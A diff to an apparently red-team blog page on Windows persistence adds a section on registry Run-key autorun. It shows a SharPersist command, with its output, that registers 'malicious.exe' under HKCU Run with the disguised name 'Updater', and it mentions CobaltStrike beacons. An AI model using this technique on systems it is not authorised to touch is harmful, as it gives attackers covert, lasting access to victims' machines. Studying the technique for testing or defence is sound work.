@@ -250,6 +250,7 @@
   <ol>
     <li><a href="#introduction">Introduction</a></li>
     <li><a href="#task-scheduler">Task Scheduler</a></li>
+    <li><a href="#registry-autorun">Registry Autorun</a></li>
   </ol>
 </nav>
         </div>
@@ -314,7 +315,7 @@
 
 
                 <time class="article-time--reading">
-                    2 minute read
+                    3 minute read
                 </time>
             </div>
         
@@ -393,6 +394,42 @@ If we are in a CobaltStrike beacon environment, in can be loaded with <code>exec
 <li><code>-o</code> is the task frequency.</li>
 </ul>
 <p>The payload will be executed hourly.</p>
+<h2 id="registry-autorun">Registry Autorun</h2>
+<p>AutoRun is a feature that allows certain applications to automatically launch when a device boots up.
+This is commonly used to start native and third-party programs such as software updaters, download managers, etc&hellip;
+The AutoRun settings can be found in the registry keys HKCU and HKLM.</p>
+<p>Again, we can use <a class="link" href="https://github.com/mandiant/SharPersist"  target="_blank" rel="noopener"
+    >SharPersist.exe</a> to execute this technique.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SharPersist</span><span class="p">\</span><span class="n">SharPersist</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">\</span><span class="n">SharPersist</span><span class="p">.</span><span class="py">exe</span> <span class="n">-t</span> <span class="n">reg</span> <span class="n">-c</span> <span class="s2">&#34;C:\ProgramData\malicious.exe&#34;</span> <span class="n">-a</span> <span class="s2">&#34;/q /n&#34;</span> <span class="n">-k</span> <span class="s2">&#34;hkcurun&#34;</span> <span class="n">-v</span> <span class="s2">&#34;Updater&#34;</span> <span class="n">-m</span> <span class="n">add</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Adding</span> <span class="n">registry</span> <span class="n">persistence</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Command</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Updater</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Command</span> <span class="n">Args</span><span class="err">:</span> <span class="p">/</span><span class="n">q</span> <span class="p">/</span><span class="n">n</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Registry</span> <span class="n">Key</span><span class="err">:</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Run</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Registry</span> <span class="n">Value</span><span class="err">:</span> <span class="n">Updater</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">INFO</span><span class="err">:</span> <span class="n">Option</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">SUCCESS</span><span class="err">:</span> <span class="n">Registry</span> <span class="n">persistence</span> <span class="n">added</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Where:</p>
+<ul>
+<li><code>-k</code> is the registry key to modify.</li>
+<li><code>-v</code> is the name of the registry key to create.</li>
+</ul>
+<p>When the victim machine reboots <code>C:\ProgramData\malicious.exe</code> will be executed, granting persistence.</p>
 
 </section>
 
